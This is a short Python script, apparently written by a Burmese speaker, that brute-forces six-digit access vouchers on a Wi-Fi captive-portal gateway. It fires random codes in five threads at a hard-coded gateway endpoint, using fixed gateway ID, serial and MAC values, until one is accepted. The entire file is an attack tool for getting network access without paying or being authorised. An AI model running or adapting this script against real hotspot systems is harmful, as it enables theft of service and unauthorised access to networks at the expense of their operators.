import requests
import random
import time
import threading

# အရောင်သတ်မှတ်ချက်များ
RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def check_code():
    while True:
        # 6-digit code ထုတ်ယူခြင်း
        code = "".join([str(random.randint(0, 9)) for _ in range(6)])
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            # timeout ကို ၁ စက္ကန့်အထိ လျှော့ချထားသည်
            res = requests.get(url, params=params, timeout=1)
            
            # Response ကို စစ်ဆေးခြင်း
            if "failed" in res.text.lower() or "expire" in res.text.lower():
                print(f"{RED}Fail Code: {code}{END}")
            elif res.status_code == 200:
                print(f"{GREEN}Success Code: {code}{END}")
                break
        except:
            # ချိတ်ဆက်မှုမရလျှင် ခေတ္တစောင့်ရန်
            time.sleep(0.1)

def start_turbo_boost():
    print(f"{CYAN}[+] Turbo Speed: Active (5x Speed Boost){END}")
    print(f"{CYAN}[+] Start Bruteforcing...{END}")
    
    # Thread ၅ ခု ပြိုင်တူ run မည်
    for i in range(5): 
        t = threading.Thread(target=check_code)
        t.start()

if __name__ == "__main__":
    start_turbo_boost()
